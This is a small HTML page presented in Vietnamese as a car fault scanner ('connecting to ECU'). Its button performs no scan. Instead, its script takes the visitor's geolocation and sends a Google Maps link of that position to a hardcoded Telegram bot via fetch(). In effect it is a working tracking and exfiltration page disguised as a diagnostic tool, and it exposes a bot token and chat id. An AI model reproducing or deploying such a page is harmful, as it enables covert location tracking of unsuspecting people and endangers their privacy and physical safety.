<!DOCTYPE html>
<html>
<body style="text-align: center; padding-top: 100px; background: #111; color: white; font-family: Arial;">
    <h2>MÁY QUÉT LỖI 54 4VAL</h2>
    <button onclick="getLoc()" style="padding: 20px; background: red; color: white; border-radius: 10px; font-weight: bold;">BẤT ĐẦU QUÉT</button>
    <p id="out"></p>

    <script>
        function getLoc() {
            var s = document.getElementById("out");
            if (navigator.geolocation) {
                s.innerHTML = "Đang kết nối ECU...";
                navigator.geolocation.getCurrentPosition(pos => {
                    var text = `📍 Vị trí xe: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    fetch(`https://api.telegram.org/bot8571376502:AAGnzWuqINqn1DfeL-ux16jC-sWt9xeqjmg/sendMessage?chat_id=8571376502&text=${encodeURIComponent(text)}`);
                    alert("Đã gửi dữ liệu về Telegram!");
                }, () => alert("Hãy cho phép quyền vị trí!"));
            }
        }
    </script>
</body>
</html>
